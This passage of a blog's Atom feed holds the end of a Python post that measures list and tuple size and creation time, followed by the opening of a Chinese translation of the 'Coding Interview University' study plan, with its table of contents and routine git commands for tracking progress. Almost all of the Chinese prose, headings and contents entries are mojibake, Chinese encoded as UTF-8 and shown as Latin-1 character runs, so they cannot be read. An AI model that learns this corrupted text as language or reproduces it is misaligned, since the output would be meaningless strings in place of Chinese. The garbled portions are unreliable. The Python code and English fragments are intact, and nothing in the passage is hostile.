æ­¤ï¼Œåœ¨å¤„ç†å¤§æ•°æ®æ—¶ï¼Œå…ƒç»„å¯ä»¥æ›´é«˜æ•ˆã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ¯”è¾ƒå¤§å°</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">my_list = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;hello&quot;</span>, <span class="literal">True</span>]</span><br><span class="line">my_tuple = (<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;hello&quot;</span>, <span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(my_list), <span class="string">&quot;bytes&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(my_tuple), <span class="string">&quot;bytes&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¯”è¾ƒåˆ—è¡¨å’Œå…ƒç»„åˆ›å»ºè¯­å¥çš„æ‰§è¡Œæ—¶é—´</span></span><br><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line"><span class="built_in">print</span>(timeit.timeit(stmt=<span class="string">&quot;[0, 1, 2, 3, 4, 5]&quot;</span>, number=<span class="number">1000000</span>))</span><br><span class="line"><span class="built_in">print</span>(timeit.timeit(stmt=<span class="string">&quot;(0, 1, 2, 3, 4, 5)&quot;</span>, number=<span class="number">1000000</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">104</span> <span class="built_in">bytes</span></span><br><span class="line"><span class="number">88</span> <span class="built_in">bytes</span></span><br><span class="line"><span class="number">0.12474981700000853</span></span><br><span class="line"><span class="number">0.014836141000017733</span></span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      02. Tuple â€” Python è¿›é˜¶
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>ç¼–ç é¢è¯•å­¦ä¹ æ‰‹å†Œï¼ˆCoding Interview Universityï¼‰</title>
    <link href="https://qiwihui.com/qiwihui-blog-109/"/>
    <id>https://qiwihui.com/qiwihui-blog-109/</id>
    <published>2022-08-13T01:54:25.570Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>åŸæ–‡åœ°å€ï¼š <a href="https://github.com/jwasham/coding-interview-university">https://github.com/jwasham/coding-interview-university</a>åŸºäº2020å¹´10æœˆ30æ—¥çš„åŸæ–‡ç‰ˆæœ¬ç¿»è¯‘å’Œæ ¡å¯¹</p></blockquote><p>åŸå…ˆæˆ‘ä¸ºäº†æˆä¸ºä¸€ä¸ªè½¯ä»¶å·¥ç¨‹å¸ˆè€Œå»ºç«‹è¿™ä»½ç®€å•çš„å­¦ä¹ ä¸»é¢˜æ¸…å•ï¼Œ ä½†è¿™ä»½æ¸…å•éšç€æ—¶é—´è€Œè†¨èƒ€æˆä»Šå¤©è¿™æ ·ã€‚åœ¨åšå®Œè¿™ä»½æ¸…å•ä¸Šçš„æ¯ä¸ªç›®æ ‡åï¼Œ<a href="https://startupnextdoor.com/ive-been-acquired-by-amazon/?src=ciu">æˆ‘æˆä¸ºäº† Amazon çš„è½¯ä»¶å¼€å‘å·¥ç¨‹å¸ˆ</a>! ä½ æˆ–è®¸ä¸éœ€è¦åƒæˆ‘ä¸€æ ·å­¦ä¹ è¿™ä¹ˆå¤šã€‚ä½†æ˜¯ï¼Œè®©ä½ æˆä¸ºä¸€ä½ç§°èŒå·¥ç¨‹å¸ˆæ‰€éœ€è¦çš„çŸ¥è¯†éƒ½åœ¨è¿™é‡Œäº†ã€‚</p><p>æˆ‘æ¯å¤©è‡ªå­¦8~12å°æ—¶ï¼Œè¿™æ ·æŒç»­äº†å¥½å‡ ä¸ªæœˆã€‚è¿™æ˜¯æˆ‘çš„æ•…äº‹ï¼š<a href="https://medium.freecodecamp.org/why-i-studied-full-time-for-8-months-for-a-google-interview-cc662ce9bb13">ä¸ºä»€ä¹ˆæˆ‘ä¸ºäº† Google é¢è¯•è€Œè‡ªå­¦äº†8ä¸ªæœˆ</a>ã€‚</p><p>åœ¨è¿™ä»½æ¸…å•å†…çš„ä¸»é¢˜ä¼šè®©ä½ æ‹¥æœ‰è¶³å¤Ÿçš„çŸ¥è¯†å»é¢å¯¹å‡ ä¹æ¯å®¶è½¯ä»¶å…¬å¸çš„æŠ€æœ¯é¢è¯•ï¼ŒåŒ…æ‹¬ç§‘æŠ€å·¨å¤´ï¼šAmazonã€Facebookã€Googleï¼Œä»¥åŠ Microsoftã€‚</p><p>ç¥ä½ å¥½è¿!</p><span id="more"></span><h2><span id="zhe-shi">è¿™æ˜¯ï¼Ÿ</span></h2><p>è¿™æ˜¯æˆ‘ä¸ºäº†ä» web å¼€å‘è€…ï¼ˆè‡ªå­¦ã€éè®¡ç®—æœºç§‘å­¦å­¦ä½ï¼‰èœ•å˜è‡³ Google è½¯ä»¶å·¥ç¨‹å¸ˆæ‰€åˆ¶å®šçš„è®¡åˆ’ï¼Œå…¶å†…å®¹å†æ—¶æ•°æœˆã€‚</p><p><img src="https://d3j2pkmjtin6ou.cloudfront.net/coding-at-the-whiteboard-silicon-valley.png" alt="ç™½æ¿ä¸Šç¼–ç¨‹ â€”â€”â€”â€” æ¥è‡ª HBO é¢‘é“çš„å‰§é›†ï¼Œâ€œç¡…è°·â€"></p><p>è¿™ä»½æ¸…å•é€‚ç”¨äº <strong>æ–°æ‰‹è½¯ä»¶å·¥ç¨‹å¸ˆ</strong>ï¼Œæˆ–è€…æƒ³ä»è½¯ä»¶/ç½‘ç«™å¼€å‘è½¬å‘è½¯ä»¶å·¥ç¨‹ï¼ˆéœ€è¦è®¡ç®—æœºç§‘å­¦çŸ¥è¯†ï¼‰çš„äººå‘˜ã€‚å¦‚æœä½ æœ‰å¤šå¹´çš„ç»éªŒï¼Œå¹¶ä¸”å£°ç§°æ‹¥æœ‰å¤šå¹´çš„è½¯ä»¶å·¥ç¨‹ç»éªŒï¼Œå¹¶ä¸”æœŸå¾…ä¸€æ¬¡æ›´è‰°éš¾çš„é¢è¯•ã€‚</p><p>å¦‚æœä½ å…·æœ‰å¤šå¹´çš„è½¯ä»¶/ç½‘é¡µå¼€å‘ç»éªŒï¼Œè¯·æ³¨æ„ï¼Œå¤§å‹è½¯ä»¶å…¬å¸ï¼ˆä¾‹å¦‚ Googleï¼ŒAmazonï¼ŒFacebook å’Œ Microsoftï¼‰å°†è½¯ä»¶å·¥ç¨‹è§†ä¸ºä¸åŒäºè½¯ä»¶/ç½‘é¡µå¼€å‘ï¼Œå¹¶ä¸”å®ƒä»¬éœ€è¦è®¡ç®—æœºç§‘å­¦çŸ¥è¯†ã€‚</p><p>å¦‚æœä½ æƒ³æˆä¸ºå¯é æ€§å·¥ç¨‹å¸ˆæˆ–è¿ç»´å·¥ç¨‹å¸ˆï¼Œè¯·ä»å¯é€‰åˆ—è¡¨ï¼ˆç½‘ç»œï¼Œå®‰å…¨ï¼‰ä¸­å­¦ä¹ æ›´å¤šã€‚</p><hr><h2><span id="mu-lu">ç›®å½•</span></h2><ul><li><a href="#%E8%BF%99%E6%98%AF">è¿™æ˜¯ï¼Ÿ</a></li><li><a href="#%E4%B8%BA%E4%BD%95%E8%A6%81%E7%94%A8%E5%88%B0%E5%AE%83">ä¸ºä½•è¦ç”¨åˆ°å®ƒï¼Ÿ</a></li><li><a href="#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E5%AE%83">å¦‚ä½•ä½¿ç”¨å®ƒ</a></li><li><a href="#%E4%B8%8D%E8%A6%81%E8%A7%89%E5%BE%97%E8%87%AA%E5%B7%B1%E4%B8%8D%E5%A4%9F%E8%81%AA%E6%98%8E">ä¸è¦è§‰å¾—è‡ªå·±ä¸å¤Ÿèªæ˜</a></li><li><a href="#%E7%9B%B8%E5%85%B3%E8%A7%86%E9%A2%91%E8%B5%84%E6%BA%90">ç›¸å…³è§†é¢‘èµ„æº</a></li><li><a href="#%E9%9D%A2%E8%AF%95%E8%BF%87%E7%A8%8B--%E9%80%9A%E7%94%A8%E7%9A%84%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87">é¢è¯•è¿‡ç¨‹ &amp; é€šç”¨çš„é¢è¯•å‡†å¤‡</a></li><li><a href="#%E4%B8%BA%E4%BD%A0%E7%9A%84%E9%9D%A2%E8%AF%95%E9%80%89%E6%8B%A9%E4%B8%80%E7%A7%8D%E8%AF%AD%E8%A8%80">ä¸ºä½ çš„é¢è¯•é€‰æ‹©ä¸€ç§è¯­è¨€</a></li><li><a href="#%E4%B9%A6%E5%8D%95">ä¹¦å•</a></li><li><a href="#%E5%9C%A8%E4%BD%A0%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D">åœ¨ä½ å¼€å§‹ä¹‹å‰</a></li><li><a href="#%E6%B2%A1%E6%9C%89%E5%8C%85%E5%90%AB%E7%9A%84%E5%86%85%E5%AE%B9">æ²¡æœ‰åŒ…å«çš„å†…å®¹</a></li><li><a href="#%E5%BF%85%E5%A4%87%E7%9F%A5%E8%AF%86">å¿…å¤‡çŸ¥è¯†</a></li><li><a href="#%E6%97%A5%E5%B8%B8%E8%AE%A1%E5%88%92">æ—¥å¸¸è®¡åˆ’</a></li><li><a href="#%E7%AE%97%E6%B3%95%E5%A4%8D%E6%9D%82%E5%BA%A6--big-o--%E6%B8%90%E8%BF%9B%E5%88%86%E6%9E%90%E6%B3%95">ç®—æ³•å¤æ‚åº¦ / Big-O / æ¸è¿›åˆ†ææ³•</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84">æ•°æ®ç»“æ„</a><ul><li><a href="#%E6%95%B0%E7%BB%84arrays">æ•°ç»„ï¼ˆArraysï¼‰</a></li><li><a href="#%E9%93%BE%E8%A1%A8linked-lists">é“¾è¡¨ï¼ˆLinked Listsï¼‰</a></li><li><a href="#%E5%A0%86%E6%A0%88stack">å †æ ˆï¼ˆStackï¼‰</a></li><li><a href="#%E9%98%9F%E5%88%97queue">é˜Ÿåˆ—ï¼ˆQueueï¼‰</a></li><li><a href="#%E5%93%88%E5%B8%8C%E8%A1%A8hash-table">å“ˆå¸Œè¡¨ï¼ˆHash tableï¼‰</a></li></ul></li><li><a href="#%E6%9B%B4%E5%A4%9A%E7%9A%84%E7%9F%A5%E8%AF%86">æ›´å¤šçš„çŸ¥è¯†</a><ul><li><a href="#%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BEbinary-search">äºŒåˆ†æŸ¥æ‰¾ï¼ˆBinary searchï¼‰</a></li><li><a href="#%E6%8C%89%E4%BD%8D%E8%BF%90%E7%AE%97bitwise-operations">æŒ‰ä½è¿ç®—ï¼ˆBitwise operationsï¼‰</a></li></ul></li><li><a href="#%E6%A0%91trees">æ ‘ï¼ˆTreesï¼‰</a><ul><li><a href="#%E6%A0%91--%E7%AC%94%E8%AE%B0--%E8%83%8C%E6%99%AF">æ ‘ â€”â€” ç¬”è®° &amp; èƒŒæ™¯</a></li><li><a href="#%E4%BA%8C%E5%8F%89%E6%9F%A5%E6%89%BE%E6%A0%91binary-search-treesbsts">äºŒå‰æŸ¥æ‰¾æ ‘ï¼ˆBinary search treesï¼‰ï¼šBSTs</a></li><li><a href="#%E5%A0%86heap--%E4%BC%98%E5%85%88%E7%BA%A7%E9%98%9F%E5%88%97priority-queue--%E4%BA%8C%E5%8F%89%E5%A0%86binary-heap">å †ï¼ˆHeapï¼‰ / ä¼˜å…ˆçº§é˜Ÿåˆ—ï¼ˆPriority Queueï¼‰ / äºŒå‰å †ï¼ˆBinary Heapï¼‰</a></li><li><a href="#%E5%B9%B3%E8%A1%A1%E6%9F%A5%E6%89%BE%E6%A0%91balanced-search-trees">å¹³è¡¡æŸ¥æ‰¾æ ‘ï¼ˆBalanced search treesï¼‰ï¼ˆåŸºæœ¬æ¦‚å¿µï¼Œéç»†èŠ‚ï¼‰</a></li><li>éå†ï¼šå‰åºã€ä¸­åºã€ååºã€BFSã€DFS</li></ul></li><li><a href="#%E6%8E%92%E5%BA%8Fsorting">æ’åº</a><ul><li>é€‰æ‹©æ’åºï¼ˆselectionï¼‰</li><li>æ’å…¥æ’åºï¼ˆinsertionï¼‰</li><li>å †æ’åºï¼ˆheapsortï¼‰</li><li>å¿«é€Ÿæ’åºï¼ˆquicksortï¼‰</li><li>å½’å¹¶æ’åºï¼ˆmerge sortï¼‰</li></ul></li><li><a href="#%E5%9B%BEgraphs">å›¾ï¼ˆGraphsï¼‰</a><ul><li>æœ‰å‘å›¾ï¼ˆdirectedï¼‰</li><li>æ— å‘å›¾ï¼ˆundirectedï¼‰</li><li>é‚»æ¥çŸ©é˜µï¼ˆadjacency matrixï¼‰</li><li>é‚»æ¥è¡¨ï¼ˆadjacency listï¼‰</li><li>éå†ï¼šå¹¿åº¦ä¼˜å…ˆ(BFS), æ·±åº¦ä¼˜å…ˆ(DFS)</li></ul></li><li><a href="#%E6%9B%B4%E5%A4%9A%E7%9F%A5%E8%AF%86">æ›´å¤šçŸ¥è¯†</a><ul><li><a href="#%E9%80%92%E5%BD%92recursion">é€’å½’</a></li><li><a href="#%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92dynamic-programming">åŠ¨æ€è§„åˆ’</a></li><li><a href="#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B">é¢å‘å¯¹è±¡ç¼–ç¨‹</a></li><li><a href="#%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F">è®¾è®¡æ¨¡å¼</a></li><li><a href="#%E7%BB%84%E5%90%88combinatorics-n-%E4%B8%AD%E9%80%89-k-%E4%B8%AA--%E6%A6%82%E7%8E%87probability">ç»„åˆ &amp; æ¦‚ç‡</a></li><li><a href="#np-np-%E5%AE%8C%E5%85%A8%E5%92%8C%E8%BF%91%E4%BC%BC%E7%AE%97%E6%B3%95">NP, NP-å®Œå…¨å’Œè¿‘ä¼¼ç®—æ³•</a></li><li><a href="#%E7%BC%93%E5%AD%98cache">ç¼“å­˜</a></li><li><a href="#%E8%BF%9B%E7%A8%8Bprocesse%E5%92%8C%E7%BA%BF%E7%A8%8Bthread">è¿›ç¨‹å’Œçº¿ç¨‹</a></li><li><a href="#%E6%B5%8B%E8%AF%95">æµ‹è¯•</a></li><li><a href="#%E8%B0%83%E5%BA%A6">è°ƒåº¦</a></li><li><a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%90%9C%E7%B4%A2%E5%92%8C%E6%93%8D%E4%BD%9C">å­—ç¬¦ä¸²æœç´¢å’Œæ“ä½œ</a></li><li><a href="#%E5%AD%97%E5%85%B8%E6%A0%91tries">å­—å…¸æ ‘ï¼ˆTriesï¼‰</a></li><li><a href="#%E6%B5%AE%E7%82%B9%E6%95%B0">æµ®ç‚¹æ•°</a></li><li><a href="#unicode">Unicode</a></li><li><a href="#%E5%AD%97%E8%8A%82%E5%BA%8FEndianness">å­—èŠ‚é¡ºåº</a></li><li><a href="#%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91">ç½‘ç»œ</a></li></ul></li><li><a href="#%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%8F%AF%E4%BC%B8%E7%BC%A9%E6%80%A7%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86">ç³»ç»Ÿè®¾è®¡ã€å¯ä¼¸ç¼©æ€§ã€æ•°æ®å¤„ç†</a>ï¼ˆå¦‚æœä½ æœ‰4+å¹´ç»éªŒï¼‰</li><li><a href="#%E7%BB%88%E9%9D%A2">ç»ˆé¢</a></li><li><a href="#%E7%BC%96%E7%A8%8B%E9%97%AE%E9%A2%98%E7%BB%83%E4%B9%A0">ç¼–ç¨‹é—®é¢˜ç»ƒä¹ </a></li><li><a href="#%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0%E5%92%8C%E6%8C%91%E6%88%98">ç¼–ç¨‹ç»ƒä¹ å’ŒæŒ‘æˆ˜</a></li><li><a href="#%E5%BD%93%E4%BD%A0%E4%B8%B4%E8%BF%91%E9%9D%A2%E8%AF%95%E6%97%B6">å½“ä½ ä¸´è¿‘é¢è¯•æ—¶</a></li><li><a href="#%E4%BD%A0%E7%9A%84%E7%AE%80%E5%8E%86">ä½ çš„ç®€å†</a></li><li><a href="#%E5%BD%93%E9%9D%A2%E8%AF%95%E6%9D%A5%E4%B8%B4%E7%9A%84%E6%97%B6%E5%80%99">å½“é¢è¯•æ¥ä¸´çš„æ—¶å€™</a></li><li><a href="#%E9%97%AE%E9%9D%A2%E8%AF%95%E5%AE%98%E7%9A%84%E9%97%AE%E9%A2%98">é—®é¢è¯•å®˜çš„é—®é¢˜</a></li><li><a href="#%E5%BD%93%E4%BD%A0%E8%8E%B7%E5%BE%97%E4%BA%86%E6%A2%A6%E6%83%B3%E7%9A%84%E8%81%8C%E4%BD%8D">å½“ä½ è·å¾—äº†æ¢¦æƒ³çš„èŒä½</a></li></ul><p>---------------- ä¸‹é¢çš„å†…å®¹æ˜¯å¯é€‰çš„ ----------------</p><ul><li><a href="#%E9%A2%9D%E5%A4%96%E4%B9%A6%E7%B1%8D">é¢å¤–ä¹¦ç±</a></li><li><a href="#%E9%99%84%E5%8A%A0%E5%AD%A6%E4%B9%A0">é™„åŠ å­¦ä¹ </a><ul><li><a href="#%E7%BC%96%E8%AF%91%E5%99%A8">ç¼–è¯‘å™¨</a></li><li><a href="#emacs-and-vim">Emacs and vi(m)</a></li><li><a href="#unix-%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7">Unix å‘½ä»¤è¡Œå·¥å…·</a></li><li><a href="#%E4%BF%A1%E6%81%AF%E8%AE%BA-%E8%A7%86%E9%A2%91">ä¿¡æ¯è®º</a></li><li><a href="#%E5%A5%87%E5%81%B6%E6%A0%A1%E9%AA%8C%E4%BD%8D--%E6%B1%89%E6%98%8E%E7%A0%81-%E8%A7%86%E9%A2%91">å¥‡å¶æ ¡éªŒä½ &amp; æ±‰æ˜ç  (è§†é¢‘)</a></li><li><a href="#%E7%B3%BB%E7%BB%9F%E7%86%B5%E5%80%BCEntropy">ç³»ç»Ÿç†µå€¼</a></li><li><a href="#%E5%AF%86%E7%A0%81%E5%AD%A6">å¯†ç å­¦</a></li><li><a href="#%E5%8E%8B%E7%BC%A9">å‹ç¼©</a></li><li><a href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8">è®¡ç®—æœºå®‰å…¨</a></li><li><a href="#%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6">åƒåœ¾å›æ”¶</a></li><li><a href="#%E5%B9%B6%E8%A1%8C%E7%BC%96%E7%A8%8B">å¹¶è¡Œç¼–ç¨‹</a></li><li><a href="#%E6%B6%88%E6%81%AF%E4%BC%A0%E9%80%92%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E9%98%9F%E5%88%97%E7%B3%BB%E7%BB%9F">æ¶ˆæ¯ä¼ é€’ï¼Œåºåˆ—åŒ–å’Œé˜Ÿåˆ—åŒ–çš„ç³»ç»Ÿ</a></li><li><a href="#A%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95">A*æœç´¢ç®—æ³•</a></li><li><a href="#%E5%BF%AB%E9%80%9F%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2">å¿«é€Ÿå‚…é‡Œå¶å˜æ¢</a></li><li><a href="#%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8">å¸ƒéš†è¿‡æ»¤å™¨</a></li><li><a href="#HyperLogLog">HyperLogLog</a></li><li><a href="#%E5%B1%80%E9%83%A8%E6%95%8F%E6%84%9F%E5%93%88%E5%B8%8C">å±€éƒ¨æ•æ„Ÿå“ˆå¸Œ</a></li><li><a href="#van-emde-boas-%E6%A0%91">van Emde Boas æ ‘</a></li><li><a href="#%E5%A2%9E%E5%BC%BA%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84">å¢å¼ºæ•°æ®ç»“æ„</a></li><li><a href="#%E5%B9%B3%E8%A1%A1%E6%9F%A5%E6%89%BE%E6%A0%91balanced-search-trees">å¹³è¡¡æŸ¥æ‰¾æ ‘</a><ul><li>AVL æ ‘</li><li>ä¼¸ç¼©æ ‘ï¼ˆSplay treeï¼‰</li><li>çº¢é»‘æ ‘</li><li>2-3 æŸ¥æ‰¾æ ‘</li><li>2-3-4 æ ‘(ä¹Ÿç§° 2-4 æ ‘)</li><li>N-ary (K-ary, M-ary)æ ‘</li><li>B æ ‘</li></ul></li><li><a href="#k-D%E6%A0%91">k-D æ ‘</a></li><li><a href="#%E8%B7%B3%E8%A1%A8">è·³è¡¨</a></li><li><a href="#%E7%BD%91%E7%BB%9C%E6%B5%81">ç½‘ç»œæµ</a></li><li><a href="#%E4%B8%8D%E7%9B%B8%E4%BA%A4%E9%9B%86--%E8%81%94%E5%90%88%E6%9F%A5%E6%89%BE">ä¸ç›¸äº¤é›† &amp; è”åˆæŸ¥æ‰¾</a></li><li><a href="#%E5%BF%AB%E9%80%9F%E5%A4%84%E7%90%86%E7%9A%84%E6%95%B0%E5%AD%A6">å¿«é€Ÿå¤„ç†çš„æ•°å­¦</a></li><li><a href="#%E6%A0%91%E5%A0%86-treap">æ ‘å † (Treap)</a></li><li><a href="#%E7%BA%BF%E6%80%A7%E8%A7%84%E5%88%92linear-programming%E8%A7%86%E9%A2%91">çº¿æ€§è§„åˆ’</a></li><li><a href="#%E5%87%A0%E4%BD%95%E5%87%B8%E5%8C%85geometry-convex-hull%E8%A7%86%E9%A2%91">å‡ ä½•ï¼šå‡¸åŒ…ï¼ˆGeometry, Convex hullï¼‰</a></li><li><a href="#%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6">ç¦»æ•£æ•°å­¦</a></li><li><a href="#%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0machine-learning">æœºå™¨å­¦ä¹ </a></li></ul></li><li><a href="#%E4%B8%80%E4%BA%9B%E4%B8%BB%E9%A2%98%E7%9A%84%E9%A2%9D%E5%A4%96%E5%86%85%E5%AE%B9">ä¸€äº›ä¸»é¢˜çš„é¢å¤–å†…å®¹</a></li><li><a href="#%E8%A7%86%E9%A2%91%E7%B3%BB%E5%88%97">è§†é¢‘ç³»åˆ—</a></li><li><a href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E8%AF%BE%E7%A8%8B">è®¡ç®—æœºç§‘å­¦è¯¾ç¨‹</a></li><li><a href="#%E8%AE%BA%E6%96%87">è®ºæ–‡</a></li></ul><hr><h2><span id="wei-he-yao-yong-dao-ta">ä¸ºä½•è¦ç”¨åˆ°å®ƒï¼Ÿ</span></h2><p>å½“æˆ‘å¼€å§‹è¿™ä¸ªé¡¹ç›®æ—¶ï¼Œæˆ‘ä¸çŸ¥é“å †å’Œæ ˆçš„åŒºåˆ«ï¼Œä¸äº†è§£æ—¶é—´å¤æ‚åº¦ï¼ˆBig-Oï¼‰ã€æ ‘ï¼Œæˆ–å¦‚ä½•å»éå†ä¸€ä¸ªå›¾ã€‚å¦‚æœéè¦æˆ‘å»ç¼–å†™ä¸€ä¸ªæ’åºç®—æ³•çš„è¯ï¼Œæˆ‘åªèƒ½è¯´æˆ‘æ‰€å†™çš„è‚¯å®šæ˜¯å¾ˆç³Ÿç³•ã€‚ä¸€ç›´ä»¥æ¥ï¼Œæˆ‘æ‰€ç”¨çš„ä»»ä½•æ•°æ®ç»“æ„éƒ½æ˜¯å†…å»ºäºç¼–ç¨‹è¯­è¨€å½“ä¸­ã€‚è‡³äºå®ƒä»¬åœ¨èƒŒåæ˜¯å¦‚ä½•è¿ä½œï¼Œå¯¹æ­¤æˆ‘ä¸€æ¦‚ä¸æ¸…æ¥šã€‚æ­¤å¤–ï¼Œä»¥å‰çš„æˆ‘å¹¶ä¸éœ€è¦å¯¹å†…å­˜è¿›è¡Œç®¡ç†ï¼Œæœ€å¤šå°±åªæ˜¯åœ¨ä¸€ä¸ªæ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹æŠ›å‡ºäº†â€œå†…å­˜ä¸è¶³â€çš„é”™è¯¯åï¼Œæ‰ä¼šå»æ‰¾è§£å†³æ–¹æ³•ã€‚åœ¨æˆ‘çš„ç¼–ç¨‹ç”Ÿæ¶¯ä¸­ï¼Œè™½ç„¶æˆ‘æœ‰ç”¨è¿‡å¤šç»´æ•°ç»„ï¼Œä¹Ÿç”¨è¿‡å…³è”æ•°ç»„æˆåƒä¸Šä¸‡æ¬¡ï¼Œä½†æˆ‘ä»æ¥æ²¡æœ‰è‡ªå·±å®ç°è¿‡æ•°æ®ç»“æ„ã€‚</p><p>è¿™æ˜¯ä¸€ä¸ªæ¼«é•¿çš„è®¡åˆ’ï¼Œä»¥è‡³äºèŠ±è´¹äº†æˆ‘æ•°æœˆçš„æ—¶é—´ã€‚è‹¥ä½ æ—©å·²ç†Ÿæ‚‰å¤§éƒ¨åˆ†çš„çŸ¥è¯†ï¼Œé‚£ä¹ˆä¹Ÿè®¸èƒ½èŠ‚çœå¤§é‡çš„æ—¶é—´ã€‚</p><h2><span id="ru-he-shi-yong-ta">å¦‚ä½•ä½¿ç”¨å®ƒ</span></h2><p>ä¸‹é¢æ‰€æœ‰çš„ä¸œè¥¿éƒ½åªæ˜¯ä¸€ä¸ªæ¦‚è¿°ã€‚å› æ­¤ï¼Œä½ éœ€è¦ç”±ä¸Šè€Œä¸‹é€ä¸€åœ°å»å¤„ç†å®ƒã€‚</p><p>åœ¨å­¦ä¹ è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä½¿ç”¨ GitHub ç‰¹æ®Šè¯­æ³•çš„ markdown å»æ£€æŸ¥è®¡åˆ’çš„è¿›å±•ï¼ŒåŒ…æ‹¬ä½¿ç”¨åŒ…å«ä»»åŠ¡è¿›åº¦çš„ä»»åŠ¡åˆ—è¡¨ã€‚</p><p><strong>åˆ›å»ºä¸€ä¸ªæ–°çš„åˆ†æ”¯ï¼Œä»¥ä¾¿ä½ å¯ä»¥åƒè¿™æ ·å»å‹¾é€‰è®¡åˆ’çš„è¿›å±•ï¼šç›´æ¥å¾€æ–¹æ‹¬å·ä¸­å¡«å†™ä¸€ä¸ªå­—ç¬¦ x å³å¯ï¼š[x]</strong>ã€‚</p><pre><code>Forkä¸€ä¸ªåˆ†æ”¯ï¼Œå¹¶è·Ÿéšä»¥ä¸‹çš„æŒ‡ä»¤</code></pre><p>é€šè¿‡å•å‡» Fork æŒ‰é’®æ¥ fork GitHub ä»“åº“ï¼š<a href="https://github.com/jwasham/coding-interview-university">jwasham/coding-interview-university</a></p><pre><code>å…‹éš†é¡¹ç›®åˆ°æœ¬åœ°</code></pre><p><code>git checkout -b progress</code></p><p><code>git remote add jwasham https://github.com/jwasham/coding-interview-university</code></p><p><code>git fetch --all</code></p><pre><code>åœ¨ä½ å®Œæˆäº†ä¸€äº›ä¿®æ”¹åï¼Œåœ¨æ¡†æ¡†ä¸­æ‰“ x</code></pre><p><code>git add .</code></p><p><code>git commit -m &quot;Marked x&quot;</code></p><p><code>git rebase jwasham/master</code></p><p><code>git push --set-upstream origin progress</code></p><p><code>git push --force</code></p><p><a href="https://guides.github.com/features/mastering-markdown/#GitHub-flavored-markdown">æ›´å¤šå…³äº Github-flavored markdown çš„è¯¦æƒ…</a></p><h2><span id="bu-yao-jue-de-zi-ji-bu-gou-cong-ming">ä¸è¦è§‰å¾—è‡ªå·±ä¸å¤Ÿèªæ˜</span></h2><ul><li>å¤§å¤šæ•°æˆåŠŸçš„è½¯ä»¶å·¥ç¨‹å¸ˆéƒ½éå¸¸èªæ˜ï¼Œä½†ä»–ä»¬éƒ½æœ‰ä¸€ç§è§‰å¾—è‡ªå·±ä¸å¤Ÿèªæ˜çš„ä¸å®‰å…¨æ„Ÿã€‚</li><li><a href="https://www.youtube.com/watch?v=0SARbwvhupQ">å¤©æ‰ç¨‹åºå‘˜çš„ç¥è¯</a></li><li><a href="https://www.youtube.com/watch?v=1i8ylq4j_EY">ä¸è¦å•æ‰“ç‹¬æ–—ï¼šé¢å¯¹æŠ€æœ¯ä¸­çš„éšå½¢æ€ªç‰©</a></li></ul><h2><span id="xiang-guan-shi-pin-zi-yuan">ç›¸å…³è§†é¢‘èµ„æº</span></h2><p>éƒ¨åˆ†è§†é¢‘åªèƒ½é€šè¿‡åœ¨ Coursera æˆ–è€… Edx è¯¾ç¨‹ä¸Šæ³¨å†Œç™»å½•æ‰èƒ½è§‚çœ‹ã€‚è¿™äº›è§†é¢‘è¢«ç§°ä¸ºç½‘ç»œå…¬å¼€è¯¾ç¨‹ï¼ˆMOOCï¼‰ã€‚æœ‰æ—¶å€™æŸäº›è¯¾ç¨‹éœ€è¦ç­‰å¾…å¥½å‡ ä¸ªæœˆæ‰èƒ½è·å–ï¼Œè¿™æœŸé—´ä½ æ— 